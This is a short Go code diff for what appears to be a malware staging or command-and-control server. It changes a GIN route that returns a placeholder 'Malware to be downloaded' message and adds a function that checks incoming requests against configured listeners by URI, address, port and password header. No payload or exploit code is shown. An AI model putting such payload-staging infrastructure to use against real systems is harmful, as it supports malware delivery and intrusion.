@@ -74,7 +74,7 @@ func startServer(host string, port string, baseURI string, password string) {
 
 	// Starting a webserver instance using GIN
 	router := gin.Default()
-	router.GET(baseURI+"/stage/:id", func(c *gin.Context) {
+	router.GET(baseURI+"/:id", func(c *gin.Context) {
 		stageId := c.Param("id")
 		c.JSON(200, gin.H{
 			"message": "Malware to be downloaded: " + stageId + "!",
@@ -98,6 +98,17 @@ func startServer(host string, port string, baseURI string, password string) {
 	// 	boldGreen.Print("[+]")
 	// 	fmt.Printf(" Password for server: %s\n", password)
 	// }
+}
+
+func isValidListener(listeners []u.Listener, uri string, serverName string, serverPort string, header string) bool {
+	// ensure that the request is valid for the endpoints.
+	for _, listener := range listeners {
+		// The 'in' here is important. This is what allows for the rest of the uri to be valid. I.E: /a?aaaaa would work.
+		if strings.Contains(uri, listener.Uri) && listener.Address == serverName && listener.Port == serverPort && listener.Password == header {
+			return true
+		}
+	}
+	return false
 }
 
 func generateRandomString(length int) string {
